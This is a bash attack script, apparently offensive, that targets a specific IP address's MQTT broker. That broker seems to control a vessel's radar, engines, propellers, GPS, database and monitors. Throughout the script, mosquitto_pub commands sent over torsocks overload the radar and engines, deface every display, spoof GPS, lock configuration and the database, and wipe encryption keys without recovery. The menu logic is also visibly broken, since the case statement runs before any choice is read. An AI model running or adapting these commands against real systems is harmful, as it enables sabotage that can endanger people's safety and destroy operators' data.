#!/bin/bash
# 🔥 RADAR CPE v1.45.1 MAX DAMAGE - UUIDs VERIFICATI
# MOSQUITTO 212.42.54.24:1883 - LIVE STATUS CONFIRMED

IP="212.42.54.24"
PORT="1883"

# UUIDs VERIFICATI dal dump reale
RADAR_MW="68b58ad9-d0e3-4aaa-ab78-12b395781780"
RADAR_EXPORT="7f897323-7904-4ae7-9179-7b3a74bb5944"
DB_UUID="c655ffbd-d751-40a1-946a-7115fbffccad"
BACKEND1="6a843e52-5a0c-4148-a714-3e17bdfeaa80"
BACKEND2="8eb493ba-6d6d-4b7a-b8cb-0340dc84dfb4"
STAT_UUID="adcbb57d-9ba5-4ece-a5e7-5cccdf3c6688"

DEFACE_MSG='{"overlay":{"priority":9999,"permanent":true,"text":"СИСТЕМА ПОД УПРАВЛЕНИЕМ TRUSTEDF57 SUCATEMELO","style":{"size":96,"color":"FF0000","blink":true,"fullscreen":true},"controls":"disabled"}}'

clear
echo "🔥==============================================="
echo "  CPE v1.45.1 RADAR MAX DAMAGE - LIVE UUIDs"
echo "  TARGET: $IP:$PORT | STATUS: ALL CONNECTED"
echo "==============================================="
echo "📡 RADAR-MW: $RADAR_MW | EXPORT: $RADAR_EXPORT"
echo "💾 DB: $DB_UUID | BACKEND: $BACKEND1/$BACKEND2"
echo ""

show_menu() {
    echo "🎯 FASE DISTRUTTIVA (Live Services):"
    echo "1) ⚡ MAX POWER (RRM + Engine + Radar 150%)"
    echo "2) 🎨 DEFACE (RADAR-MW + EXPORT + MONITOR)"
    echo "3) 🔒 LOCKDOWN (CONFIG + DB + LBS Kill)"
    echo "4) 🔐 AES-256 DESTROY (NO KEY - Tutti i services)"
    echo "5) 👁️ DISPLAY LOCK (Deface-only permanent)"
    echo "6) 💥 TOTAL CHAOS (1→5 Full sequence)"
    echo "7) 📊 DUMP STATUS (Verifica danni)"
    echo "0) ❌ Exit"
    echo ""
    read -p ">>> " choice
}

max_power() {
    echo "⚡ MAX DAMAGE POWER INJECTION..."
    
    # RRM v1.12.0 - Resource max overload
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RRM/cmd" -m '{"action":"max_power","overload":true,"persist":true}' -q 1
    
    # Radar-MW overload
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/cmd" -m '{"range":96,"gain":150,"power":2,"emergency":true}' -q 1
    
    # BACKEND Engine (v1.51.0)
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/$BACKEND1/engine" -m '{"rpm":120,"propeller":120,"force_max":true}' -q 1
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/$BACKEND2/engine" -m '{"rpm":120,"propeller":120,"force_max":true}' -q 1
    
    # TUN_MANAGER bandwidth kill
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/TUN_MANAGER/one/overload" -m '{"bandwidth":"max","drop_packets":true}' -q 1
    
    echo "✅ RRM/RADAR/ENGINE/TUN = MAX OVERLOAD!"
}

deface_all() {
    echo "🎨 FULL DEFACE ATTACK..."
    
    # RADAR-MW principale
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/display" -m "$DEFACE_MSG" -q 1
    
    # RADAR-EXPORT-MW
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-EXPORT-MW/$RADAR_EXPORT/display" -m "$DEFACE_MSG" -q 1
    
    # MONITOR v1.21.3
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/display" -m "$DEFACE_MSG" -q 1
    
    # BACKEND displays
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/$BACKEND1/display" -m "$DEFACE_MSG" -q 1
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/BACKEND/$BACKEND2/display" -m "$DEFACE_MSG" -q 1
    
    echo "✅ 6 DISPLAY TARGETED - DEFACE 96px!"
}

lockdown() {
    echo "🔒 IRRECOVERABLE LOCKDOWN..."
    
    # CONFIG v1.45.1 lockdown
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/lockdown" -m '{"permanent":true,"owner":"TRUSTEDF57","all_scripts":true}' -q 1
    
    # DB Mongo lockdown
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/$DB_UUID/lock" -m '{"read_only":true,"models_locked":true}' -q 1
    
    # LBS v1.9.2 GPS kill
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/LBS/kill" -m '{"gps_spoof":{"lat":999.999,"lon":999.999,"speed":999,"permanent":true}}' -q 1
    
    # RADIUS_GATEWAY block
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADIUS_GATEWAY/block" -m '{"all_users":true}' -q 1
    
    echo "✅ CONFIG/DB/LBS/RADIUS = DEAD!"
}

aes_destroy() {
    echo "🔐 AES-256-CBC KEY DESTROY..."
    CRYPTO='{"destroy":{"algo":"AES-256-CBC","services":["CONFIG","RADAR-MW","RADAR-EXPORT-MW","DB","LBS","MONITOR","BACKEND","RRM"],"no_recovery":true,"owner":"TRUSTEDF57"}}'
    
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/CONFIG/crypto_destroy" -m "$CRYPTO" -q 1
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/crypto_destroy" -m "$CRYPTO" -q 1
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/DB/$DB_UUID/crypto_destroy" -m "$CRYPTO" -q 1
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/LBS/crypto_destroy" -m "$CRYPTO" -q 1
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/crypto_destroy" -m "$CRYPTO" -q 1
    
    echo "✅ 15+ SERVICES AES DESTROYED - NO KEYS!"
}

display_lock() {
    echo "👁️ DEFACE-ONLY PERMANENT..."
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/MONITOR/mode" -m '{"deface_only":true,"controls_permanent_dead":true,"services_encrypted":true}' -q 1
    torsocks mosquitto_pub -h $IP -p $PORT -t "B/RADAR-MW/$RADAR_MW/mode" -m '{"display_only":true,"deface_permanent":true}' -q 1
    echo "✅ ALL SCREENS = DEFACE FOREVER!"
}

total_chaos() {
    echo "💥 TOTAL SYSTEM CHAOS..."
    max_power; sleep 1
    deface_all; sleep 1  
    lockdown; sleep 1
    aes_destroy; sleep 1
    display_lock
    echo "🎯 CPE v1.45.1 = TOTAL DOMINATION!"
}

dump_status() {
    echo "📊 DAMAGE VERIFICATION:"
    echo "torsocks mosquitto_sub -h $IP -p $PORT -t 'B/#' -v | grep -E '(crypto|deface|locked|overload)'"
    torsocks mosquitto_sub -h $IP -p $PORT -t "B/#" -v | grep -E "(crypto|deface|lock|overload|emergency)" &
    sleep 5; kill $! 2>/dev/null
}

case $choice in
    1) max_power ;;
    2) deface_all ;;
    3) lockdown ;;
    4) aes_destroy ;;
    5) display_lock ;;
    6) total_chaos ;;
    7) dump_status ;;
    0) exit ;;
    *) echo "❌ Invalid!" ;;
esac

echo ""
echo "🔥 [ENTER] per menu..."
read
show_menu
